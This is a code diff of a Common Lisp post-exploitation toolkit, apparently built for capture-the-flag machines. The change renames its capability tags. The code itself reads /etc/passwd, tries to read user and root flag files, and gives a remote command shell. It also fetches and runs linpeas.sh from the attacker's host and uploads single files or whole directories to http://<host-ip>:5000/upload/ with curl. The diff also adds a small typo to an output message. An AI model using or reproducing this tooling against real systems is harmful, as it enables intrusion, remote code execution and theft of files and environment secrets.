@@ -21,41 +21,44 @@
   (loop for glyph in (spell-needs spell)
         always (glyph/available? glyph :do-not-fail t)))
 
-(defun spell/list (&key show-all)
+(defun spell/list ()
+  (a:hash-table-keys *spells*))
+
+(defun spell/info (&key show-all)
   (loop for spell being the hash-value in *spells*
         for runnable = (spell/runnable? spell)
         if (and (not show-all) runnable)
         do (out "[+] Spell \"~a\"~%" (spell-name spell))
-        and do (out "    Runnable? ~a (needs ~{:~a~^, ~})~%" 
+        and do (out "    Runnable? ~a (needs ~{:~a~^, ~})~%~%" 
                     (yes? runnable)
                     (spell-needs spell))))
 
-;; read
+;; sight
 
-(define-spell system-info (:read) ()
+(define-spell system-info (:sight) ()
   "read system information"
-  (parse-key=value (use :read "/etc/os-release")))
+  (parse-key=value (use :sight "/etc/os-release")))
 
-(define-spell all-users (:read) ()
+(define-spell all-users (:sight) ()
   "list all the users from /etc/passwd"
-  (loop for line in (str:lines (use :read "/etc/passwd"))
+  (loop for line in (str:lines (use :sight "/etc/passwd"))
         if (not (alexandria:emptyp line))
         collect (car (str:split ":" line))))
 
-(define-spell users (:read) ()
+(define-spell users (:sight) ()
   "list the users that are not default"
   (remove-if
    #'(lambda (u) (member u *default-users* :test #'string=))
    (all-users)))
 
-(define-spell flag (:read) (&key username root)
+(define-spell flag (:sight) (&key username root)
   "try to read the flag from user home folders"
   (flet ((try-for-flag (u)
-           (format t "[+] Trying to read ~a's flag...~%" u)
+           (format t "[+] Trying to rea d ~a's flag...~%" u)
            (ignore-errors
              (str:trim
-              (use :read (format nil "/home/~a/~a.txt"
-                                 u (if root "root" "user")))))))
+              (use :sight (format nil "/home/~a/~a.txt"
+                                  u (if root "root" "user")))))))
     (if username
         (try-for-flag username)
         (s:~>> (all-users)
@@ -63,18 +66,18 @@
                (remove-if #'null)
                (remove-if #'a:emptyp)))))
 
-;; exec
+;; command
 
 (defparameter *current-dir* nil)
 
 (defun exec-keep-pwd (command)
   (if (str:starts-with? "cd " command)
       (setf *current-dir* 
-            (glyph/use :exec (fmt "cd ~a && cd ~a && pwd"
-                                  *current-dir*
-                                  (str:replace-first "cd " "" command))))
+            (glyph/use :command (fmt "cd ~a && cd ~a && pwd"
+                                     *current-dir*
+                                     (str:replace-first "cd " "" command))))
       (ignore-errors
-        (glyph/use :exec (fmt "cd ~a && ~a" *current-dir* command)))))
+        (glyph/use :command (fmt "cd ~a && ~a" *current-dir* command)))))
 
 (defun fake-shell-prompt (&optional (prepend-newline t))
   (out "~a[~a]$ " 
@@ -83,9 +86,9 @@
   (force-output)
   (read-line))
 
-(define-spell fake-shell (:exec) ()
+(define-spell fake-shell (:command) ()
   "gives a 'fake' shell that allows for command execution and follows cd commands"
-  (setf *current-dir* (use :exec "pwd"))
+  (setf *current-dir* (use :command "pwd"))
 
   ;; shell
   (loop for pnl = nil then t
@@ -93,20 +96,20 @@
         if (string= command "exit") do (return)
         else do (out "~a~%" (exec-keep-pwd command))))
 
-(define-spell linpeas (:exec) ()
+(define-spell linpeas (:command) ()
   (out "[+] Downloading linpeas~%")
-  (use :exec (fmt "curl http://~a:5000/tools/linpeas.sh > /tmp/linpeas.sh"
-                  *host-ip*))
+  (use :command (fmt "curl http://~a:5000/tools/linpeas.sh > /tmp/linpeas.sh"
+                     *host-ip*))
 
   (out "[+] Running linpeas.sh~%")
-  (use :exec "sh /tmp/linpeas.sh > /tmp/output.txt")
+  (use :command "sh /tmp/linpeas.sh > /tmp/output.txt")
 
   (out "[+] Results:~%")
-  (use :exec "cat /tmp/output.txt"))
+  (use :command "cat /tmp/output.txt"))
 
-(define-spell list-files (:exec) (path &key absolute-path)
+(define-spell list-files (:command) (path &key absolute-path)
   "returns a list of all files in the path"
-  (let ((files (str:split #\Newline (use :exec (fmt "ls ~a" path))))
+  (let ((files (str:split #\Newline (use :command (fmt "ls ~a" path))))
         (ends-with-slash (str:ends-with? "/" path)))
     (if absolute-path
         (mapcar #'(lambda (f)
@@ -116,29 +119,29 @@
                 files)
         files)))
 
-(define-spell download (:exec) (path)
+(define-spell download (:command) (path)
   "downloads the file to your project's folder"
-  (use :exec (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
-                  path *host-ip*)))
+  (use :command (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
+                     path *host-ip*)))
 
-(define-spell download-all (:exec) (path)
+(define-spell download-all (:command) (path)
   "downloads all files in the path to your project's folder"
   (let ((files (list-files path :absolute-path t)))
     (dolist (file files)
-      (use :exec (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
-                      file *host-ip*)))))
+      (use :command (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
+                         file *host-ip*)))))
 
-(define-spell environment (:exec) (&optional key)
+(define-spell environment (:command) (&optional key)
   "returns all environment variables"
-  (let ((res (parse-key=value (use :exec "set"))))
+  (let ((res (parse-key=value (use :command "set"))))
     (if key
         (cdr (find-if #'(lambda (k) (string= k key)) res :key #'car))
         res)))
 
-(define-spell path (:exec) ()
+(define-spell path (:command) ()
   (str:split ":" (environment "PATH")))
 
-(define-spell system-binaries (:exec) (&key absolute-path)
+(define-spell system-binaries (:command) (&key absolute-path)
   "list the binaries in the default places"
   (remove-duplicates
    (mapcan #'(lambda (p)
